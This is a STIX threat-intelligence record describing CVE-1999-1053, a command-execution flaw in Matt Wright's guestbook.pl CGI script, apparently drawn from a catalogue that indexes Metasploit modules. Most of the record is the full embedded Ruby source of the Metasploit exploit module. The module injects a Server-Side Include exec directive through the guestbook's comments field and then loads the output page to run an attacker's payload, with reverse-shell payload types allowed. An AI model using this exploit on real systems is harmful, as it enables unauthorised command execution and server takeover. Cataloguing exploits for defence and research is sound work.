{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8e67f6e9-c40b-4e62-9900-f06dcbeb47cc",
    "created": "2024-08-14T17:13:51.530495Z",
    "modified": "2024-08-14T17:13:51.530499Z",
    "name": "Matt Wright guestbook.pl Arbitrary Command Execution",
    "description": " The Matt Wright guestbook.pl <= v2.3.1 CGI script contains a flaw that may allow arbitrary command execution. The vulnerability requires that HTML posting is enabled in the guestbook.pl script, and that the web server must have the Server-Side Include (SSI) script handler enabled for the '.html' file type. By combining the script weakness with non-default server configuration, it is possible to exploit this vulnerability successfully. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/guestbook_ssi_exec.rb",
            "external_id": "guestbook_ssi_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-1053"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Matt Wright guestbook.pl Arbitrary Command Execution',\n      'Description'    => %q{\n        The Matt Wright guestbook.pl <= v2.3.1 CGI script contains\n        a flaw that may allow arbitrary command execution. The vulnerability\n        requires that HTML posting is enabled in the guestbook.pl script, and\n        that the web server must have the Server-Side Include (SSI) script\n        handler enabled for the '.html' file type. By combining the script\n        weakness with non-default server configuration, it is possible to exploit\n        this vulnerability successfully.\n      },\n      'Author'         => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '1999-1053' ],\n          [ 'OSVDB', '84' ],\n          [ 'BID', '776' ],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl ruby python bash-tcp telnet',\n            }\n        },\n      'Platform'       => %w{ linux unix win },\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '1999-11-05',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('URI', [true, \"guestbook.pl script path\", \"/cgi-bin/guestbook.pl\"]),\n          OptString.new('URIOUT', [true, \"guestbook.html output\", \"/guestbook/guestbook.html\"]),\n        ])\n  end\n\n  def exploit\n    realname\t= rand_text_alphanumeric(20)\n    email\t\t= rand_text_alphanumeric(20)\n    city\t\t= rand_text_alphanumeric(20)\n    state\t\t= rand_text_alphanumeric(20)\n    country \t= rand_text_alphanumeric(20)\n\n    sploit = Rex::Text.uri_encode(\"<!--#exec cmd=\\\"\" + payload.encoded.gsub('\"','\\\"') + \"\\\"\", 'hex-normal')\n\n    req1 = send_request_cgi({\n      'uri'     => normalize_uri(datastore['URI']),\n      'method'  => 'POST',\n      'data'    => \"realname=#{realname}&username=#{email}&city=#{city}&state=#{state}&country=#{country}&comments=#{sploit}\",\n    }, 25)\n\n    req2 = send_request_raw({\n      'uri'     => normalize_uri(datastore['URIOUT']),\n    }, 25)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "1999-11-05",
    "x_mitre_platforms": [
        "%w{ linux unix win }"
    ]
}